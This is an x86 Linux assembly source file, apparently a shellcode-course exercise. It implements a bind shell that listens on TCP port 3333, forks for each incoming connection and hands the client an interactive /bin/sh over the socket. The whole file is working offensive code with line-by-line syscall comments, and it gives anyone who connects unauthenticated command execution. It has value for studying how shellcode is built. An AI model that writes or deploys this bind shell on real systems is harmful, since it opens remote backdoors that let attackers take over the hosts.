; Filename: ShellBindTcp.nasm
; Author:  SLAE-935
;
; Purpose: spawn /bin/sh on tcp port handling multiple connections

global _start			

section .text

_start:

    ; Socket
    ; soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ; EAX = socket_call = 102
    ; EBX = SYS_SOCKET = 1
    ; ECX = pointer to ESP (IPPROTO_TCP, SOCK_STREAM, AF_INET)
    mov eax, 102
    mov ebx, 1
    push 6 ; IPPROTO_TCP
    push 1 ; SOCK_STREAM
    push 2 ; AF_INET
    mov ecx, esp ; ptr to argument array
    int 0x80 
    ; EAX = ret value (socket descriptor)

    mov edi, eax ; save socket descriptor in edi

    ; Bind
    ; bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    ; EAX = socket_call = 102
    ; EBX = SYS_BIND=2
    ; ECX = pointer to ESP (16, ptr (struct sockaddr), edi)
    mov eax, 102
    mov ebx, 2

    ; build sockaddr_in structure
    ; by definition
    ; struct sockaddr_in {
    ;   short            sin_family;   // AF_INET -> 2 bytes
    ;   unsigned short   sin_port;     // 2 bytes
    ;   struct in_addr   sin_addr;     // see struct in_addr, below
    ;   char             sin_zero[8];  // 8 bytes
    ; };
    ;   
    ;   struct in_addr {
    ;       unsigned long s_addr;  // 4 bytes
    ;   };
    ;
    ; shellcode usage:
    ; serv_addr.sin_family = AF_INET; 
    ; serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    ; serv_addr.sin_port = htons(BIND_PORT); 

    ; Reverse pushing
    push 0 ; htonl(INADDR_ANY)
    push WORD 0x050d ; htons(3333) -> word = 2bytes
    push WORD 2 ; AF_INET -> word = 2bytes

    mov ecx, esp ; pointer to struct sockaddr_in serv_addr

    ; push args
    push 16 ; sizeof(sin_family (2 bytes) + sin_port (2 bytes) + sin_addr (4 bytes) + sin_zero (8 bytes))
    push ecx ; (struct sockaddr *) &serv_addr
    push edi ; soc_des

    mov ecx, esp ; ptr to argument array

    int 0x80
    ; EAX = return value (0x00000000 - success, 0xffffffff - error)

    ; Listen
    ; soc_rc = listen(soc_des, 5)
    ; EAX = socket_call=102
    ; EBX = SYS_LISTEN=4
    ; ECX = pointer to ESP (5, EDI)
    mov eax, 102
    mov ebx, 4

    push 5 ; 
    push edi ; soc_des

    mov ecx, esp		; ptr to argument array

    int 0x80
    ; EAX = return value (0 - success, -1 - error)

accept_handler:

    ; Accept
    ; soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len)
    ; EAX = socket_call = 102
    ; EBX = SYS_ACCEPT = 5
    ; ECX = pointer to ESP (0, 0, EDI)
    mov eax, 102
    mov ebx, 5

    push 0 ; &soc_len = 0 not used
    push 0 ; (struct sockaddr *) &client_addr = 0 not used
    push EDI ; soc_des
    mov ecx, esp ; ptr to argument array

    int 0x80
    ; EAX = return value (file descriptor) soc_cli

    mov esi, eax ; now esi contains soc_cli

    ; Fork
    ; fork()
    ; EAX = fork = 2
    mov eax, 2

    int 0x80
    ; EAX = return value (process PID)

    ; if PID != 0 then parent process/Error
    or eax, eax
    jnz parent_or_error
    
    ; close(sock)
    ; EAX = close = 6
    ; EBX = file descriptor
    ; close master socket
    mov eax, 0x06
    mov ebx, edi
    int 0x80
    ; EAX = return value (0 - success, -1 - error)

    ; Dup2
    ; dup2(soc_cli,0); // standard input
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = ESI = soc_cli
    ; ECX = Standard Input = 0
    mov eax, 63 
    mov ebx, esi
    mov ecx, 0

    int 0x80

    ; dup2(soc_cli,1);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = ESI = soc_cli
    ; ECX = Standard Output = 1
    mov eax, 63
    mov ecx, 1

    int 0x80

    ; dup2(soc_cli,2);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = ESI = soc_cli
    ; ECX = Standard Error = 2
    mov eax, 63
    mov ecx, 2

    int 0x80

    ; Execl
    ; execl("/bin/sh","sh",(char *)0);
    ; EAX = execl = 11
    ; EBX = ptr /bin//sh,\0
    ; ECX = ptr 0 (argv[0])
    ; EDX = ptr 0 (envp)
    mov eax, 11

    ;/bin//sh -> 0x2f62696e2f2f7368
    push 0 ; '\0' null terminator
    push 0x68732f2f ; //sh <-little endian
    push 0x6e69622f ; /bin <-little endian
    mov ebx, esp ; pointer to "/bin/sh"\0

    mov ecx, 0
    mov edx, 0

    int 0x80

parent_or_error:

    ; parent process
    ; need to close client socket fd (stored in ESI)

    ; close(sock)
    ; EAX = close = 6
    ; EBX = close client socket - fd is stored in ESI
    mov eax, 6
    mov ebx, esi
    int 0x80
    jmp accept_handler